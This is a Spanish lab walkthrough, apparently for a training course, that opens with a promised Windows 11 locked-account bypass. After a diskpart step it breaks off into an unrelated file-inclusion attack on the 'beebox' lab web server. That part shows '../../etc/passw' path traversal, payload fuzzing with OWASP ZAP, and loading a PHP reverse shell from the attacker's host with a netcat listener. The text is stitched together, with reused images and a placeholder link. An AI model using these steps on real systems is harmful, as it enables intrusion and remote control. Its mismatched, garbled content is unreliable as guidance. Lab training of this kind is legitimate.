---
title: WIN - File Inclusion
published: true
categories: [Windows]
tags: [eJPT, eWPT, eCPPTv2, OSCP, Dificil]
---


¡Hola! 
Vamos a resolver una máquina windows 11 bloqueada sin acceso a la contraseña del usuario administrador.
Para esta ocasión usaremos la utilidad de windows de `Accesibilidad` para convertirla en la CMD y poder ejecutar los comandos necesarios para crearnos un usuario con privilegios de administrador y poder cambiar la contraseña de nuestro usuario olvidado.


* * *

# PRIMEROS PASOS
En primer lugar deberemos de encender nuestro equipo en modo seguro. Para ello encenderemos nuestro ordenador hasta llegar a la pantalla de Inicio.
<img src="https://media.discordapp.net/attachments/1103281093643345932/1110246354879533207/etc_pass.png?width=1090&height=589">

Para iniciar nuestro windows 11 en modo seguro deberemos de presionar la `tecla SHIFT` y seguido sin soltarla presionaremos en el icono de inicio y reiniciaremos el ordenador. Cuando se esté reiniciando podremos soltar la `tecla SHIFT`. Nos debería aparecer esta pantalla al reiniciarse el ordenador: 
<img src="https://media.discordapp.net/attachments/1103281093643345932/1110246354879533207/etc_pass.png?width=1090&height=589">

Seguido de ello tenemos que clickar en `elegir una opción` - `solucionar un problema` - `opciones avanzadas` - `símbolo del sistema`.

![Texto alternativo](URL_del_GIF)

Una vez en la terminal de nuestro sistema operativo necesitaremos hacer los siguientes pasos...

* * * 

# DENTRO DE LA TERMINAL
En primer lugar deberemos de hallar en que partición se encuentra nuestro windows instalado. Para ello ejecutaremos los siguientes comandos.

```bash 
system32> diskpart
```



Cuando seleccionamos un lenguaje, podemos ver que la URL de nuestra aplicación web cambia. 
Esto sería un vacío donde podriamos realizar nuestras técnicas de intrusión.

Observamos que dentro del link añade una particularidad, `?language=lang_en.php` donde podemos comenzar a intentar escalar privilegios usando `../../etc/passw` para subir entre carpetas dentro del servidor web y podriamos ver si nos devuelve el fichero sensible.

<img src="https://media.discordapp.net/attachments/1103281093643345932/1110246354879533207/etc_pass.png?width=1090&height=589">

Si analizamos el código fuente de la aplicación web, podemos ver que nos ha devuelto el fichero completo con sus directorios y nombres de usuario

<img src="https://media.discordapp.net/attachments/1103281093643345932/1110246460185907280/codigo_fuente.png?width=966&height=589">

Esta información podemos usarla para aplicarle ténicas de `fuzzing` con `OWAS-ZAP`. Eso lo veremos en el siguiente paso.

* * *

# USO DE LA APLICACIÓN
La aplicación que vamos a usar es `OWAS-ZAP` con técnicas de `fuzzing` cargando diccionarios, en este caso usaremos el diccionario del repositorio `AllPayloadThings` usando el fichero de `File Inclusion`

<img src="https://media.discordapp.net/attachments/1103281093643345932/1110246521154318436/usopayload.png?width=926&height=589">

Una vez configurado el fichero que vamos a usar, lanzamos el fuzzer y analizaremos los datos hallados.
Podemos observar en el `Fuzzed 7` un fichero `etc/apache2/` lo que podría hacernos ver una apertura de seguridad muy seria.

En nuestra máquina kali linux tenemos el repositorio de `webshells` con la cual podemos hacer una `shell` remota hacia nuestra máquina aprovechando la vulnerabilidad del servidor apache.

```bash
cd /usr/share/webshells/php
```

Usaremos el repositorio `php` ya que sabemos que el motor de la aplicacion web está en el lenguaje `php`.
Dentro del directorio podremos encontrar diferentes tipos de webshell a usar. Nosotros cargaremos una `reverseshell`.
En este caso tendremos que revisar el source code del fichero para configurar la dirección IP y puerto que usaremos.

```bash
nano php-reverse-shell.php
```
Una vez configurado nuestro archivo, tenemos que copiar en el directorio `/var/www/html`.

```bash
cp php-reverse-shell.php /var/www/html
```
Una vez configurado nuestro fichero a usar, podremos proceder a colocar nuestro enlace, previamente iniciando un servicio de apache2 y poniendo nuestra máquina a la escucha y cargaremos nuestra webshell desde el mismo link de la aplicación web.

```bash
service apache2 start
```

```bash
nc -lvnp 44044
```

Probaremos con cargar dentro del URL de la aplicación web nuestra `webshell` 

`http://nuestraIPdelamáquina/php-reverse-shell.php`

Y cuando vayamos hacia nuestra `shell` podremos observar que hemos conectado una remote shell hacia nuestra máquina y estamos dentro de la máquina `beebox`.

```bash
whoami
```
Podemos observar que estamos en el directorio /home/root/ de `beebox`



* * *

*__Esto es un ejercicio con fines didácticos realizado para MasterD.__*
